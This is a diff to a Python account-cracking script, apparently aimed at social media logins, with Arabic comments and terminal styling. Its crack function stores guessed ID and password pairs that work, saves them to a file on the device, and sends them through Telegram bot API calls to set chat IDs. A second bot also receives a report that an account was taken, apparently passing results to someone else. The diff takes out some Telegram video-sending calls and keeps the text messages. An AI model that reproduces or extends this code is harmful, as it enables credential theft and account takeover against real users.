@@ -1,3 +1,11 @@
+import uuid
+import json
+import user_agent
+import time
+import sys
+import socket
+import datetime
+from datetime import date
 import requests,os,sys,random, re
 from rich.console import Console as NETWORK_KURD
 from concurrent.futures import ThreadPoolExecutor as THREADING
@@ -5,8 +13,8 @@ from rich.panel import Panel as ALOAN
 from rich import print as PRENTO
 import os
 import requests
-import time
 import random
+
 Z = '\033[1;31m' #احمر
 R = '\033[1;31m' #احمر
 X = '\033[1;33m' #اصفر
@@ -5273,13 +5281,6 @@ def crack(idf,pwv):
 				cp+=1
 				akun.append(idf + '|' + pw)
 				requests.get('https://api.telegram.org/bot' + str(kld) + '/sendMessage?chat_id=' + str(sos) + '&text=' + str(ali))
-				url = f"https://api.telegram.org/bot{kld}/sendVideo"
-				data = {
-				"chat_id": sos,
-				"video": "https://t.me/GGPPE/12",
-				"caption": ali
-				}
-				response = requests.post(url, data=data)
 				soso = f'''
 				صاحب الايدي صاد حساب (ID)'''
 				requests.get('https://api.telegram.org/bot' + str(moon) + '/sendMessage?chat_id=' + str(sun) + '&text=' + str(soso))
@@ -5302,13 +5303,6 @@ def crack(idf,pwv):
 				cetak(nel(statusok1, title='OK'))
 				open('/sdcard/𝚁𝙾𝚁-𝙾𝙺.txt', 'a').write(idf+'|'+pw+'|'+joined+'\n')
 				requests.get('https://api.telegram.org/bot' + str(kld) + '/sendMessage?chat_id=' + str(sos) + '&text=' + str(rajy))
-				url = f"https://api.telegram.org/bot{kld}/sendVideo"
-				data = {
-				"chat_id": sos,
-				"video": "https://t.me/GGPPE/12",
-				"caption": rajy
-				}
-				response = requests.post(url, data=data)				
 				sara = f'''
 				صاحب الايدي صاد حساب (ID)'''
 				requests.get('https://api.telegram.org/bot' + str(moon) + '/sendMessage?chat_id=' + str(sun) + '&text=' + str(sara))
